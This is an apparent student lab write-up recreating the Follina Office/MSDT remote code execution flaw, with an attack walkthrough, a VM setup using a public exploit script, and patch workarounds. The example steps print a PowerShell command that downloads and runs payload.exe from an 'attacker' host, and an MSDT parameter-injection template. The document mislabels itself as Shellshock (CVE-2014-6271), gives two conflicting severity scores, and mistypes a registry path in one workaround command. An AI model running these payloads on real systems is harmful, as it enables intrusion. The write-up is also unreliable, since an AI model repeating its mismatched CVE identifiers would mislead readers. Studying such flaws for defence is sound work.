# CVE Recreation: Shellshock (CVE-2014-6271)

### Details

CVE ID: <br>
**CVE-2014-6271**

Vulnerability Name: <br>
**Follina**

Vulnerable Software: <br>
**Microsoft Office (Word, Excel, other apps using MSHTML and MSDT) – versions prior to June 2022 patch**

Vulnerability Type: <br>
**Remote Code Execution (via MSDT protocol abuse)**

Severity: <br>
**7.8 CVSS v3 (High), 9.8 CVSS v3 (Critical)**

---

### Summary

Follina is a remote code execution vulnerability in Microsoft Office’s handling of the ms-msdt protocol. An attacker can craft a malicious Office document that references a remote HTML file, which then calls ms-msdt: with parameters causing the Microsoft Support Diagnostic Tool (MSDT) to execute arbitrary code.

This flaw is dangerous because:

- No macros are required, even security settings that block macros won’t help.
- Code execution can occur just by opening the document, and sometimes even via the preview pane in Explorer.
- It works even if Protected View is enabled, because ms-msdt calls are handled outside the usual macro execution flow.

---

### Example of the Vulnerability

1. Attacker crafts a `.docx` file containing a link to a malicious HTML payload hosted remotely.
2. The HTML contains a link using the ms-msdt protocol:
```bash
ms-msdt:/id PCWDiagnostic /skip force /param ...
```
3. When the victim opens the document, Office retrieves the HTML and automatically invokes MSDT.
4. MSDT runs a PowerShell command embedded in the parameters, for example:
```powershell
powershell.exe -Command "Invoke-WebRequest http://attacker/payload.exe -OutFile C:\Windows\Temp\payload.exe; Start-Process C:\Windows\Temp\payload.exe"
```
5. The attacker gains code execution on the victim machine without user consent.

---

### How it works

**Step 1 – Office loads external content**

The .docx file is actually a ZIP containing XML files. One of these XML files can point to an external resource (the attacker’s HTML) through a target attribute.

<br>

**Step 2 – HTML uses ms-msdt**

When Office loads the HTML, the browser-like MSHTML engine processes it. If the HTML contains a ms-msdt: link, Windows recognizes it as a registered protocol and launches the Microsoft Support Diagnostic Tool.

<br>

**Step 3 – MSDT command injection**

MSDT accepts parameters like /id and /param. The vulnerability is that these parameters can be crafted so that a command injection occurs — for example, passing something like:
```bash
/param "IT_BrowseForFile=$(Invoke-Expression('malicious PowerShell here'))"
```

This causes MSDT to run arbitrary PowerShell code.

<br>

**Step 4 – Payload execution**

The PowerShell payload can:
- Download a file (Invoke-WebRequest)
- Save it to disk
- Execute it (Start-Process)
  
This effectively gives the attacker remote code execution with the same privileges as the victim.

---

### CVE Recreation

#### Setup

- [Windows 10 (Build 19044.1288)](https://os.click/en/Windows:Windows_10:2021_LTSC:19044.1288:Enterprise:en-us:x86) and Kali Linux in VirtualBox
- Download Office2013 32-bit on the Windows 10 machine using Powershell (Administrator):
  
  `bitsadmin /TRANSFER O13DL /DOWNLOAD /PRIORITY high https://ia803209.us.archive.org/29/items/microsoft-office-2013-pro-plus-sp-1-english-32-bit_202005/Microsoft-Office-2013-Pro-Plus-SP1-English-32Bit.zip C:\office32.zip`
- Install Office2013
- On Kali Linux, install python3 and download follina.py:

  `sudo apt install python3 git`
  
  `git clone https://github.com/JohnHammond/msdt-follina`
- Run follina.py script (Examples: `python3 follina.py`, `python3 follina.py -c "notepad"`, `python3 follina.py -r 9001`. More details [here](https://github.com/JohnHammond/msdt-follina))

---

### Patch & Mitigation

- Microsoft Patch:
  
  Released in June 2022. Updates MSHTML and MSDT handling in Office so that ms-msdt calls are blocked by default.

- Workarounds (pre-patch):

  a. Backup and disable the MSDT URL protocol handler using Command Prompt as Administrator:

  ```cmd
  reg export HKEYCLASSES_ROOT\ms-msdt _filename
  reg delete HKEY_CLASSES_ROOT\ms-msdt /f
  ```

  b. Use Protected View and avoid opening files from untrusted sources.

  c. Block outbound access to attacker-controlled domains.

---

### Reflection

Follina showed that non-macro-based Office exploitation can be just as dangerous as macro-based attacks. It highlighted how little-known Windows features like MSDT can be leveraged for code execution when combined with Office’s content-fetching capabilities.

For defenders, the takeaway is that patching and attack surface reduction are critical, relying on macro blocking alone is insufficient. For attackers, Follina was a reminder that “living off the land” (using built-in tools like MSDT, PowerShell) is an effective way to evade detection.
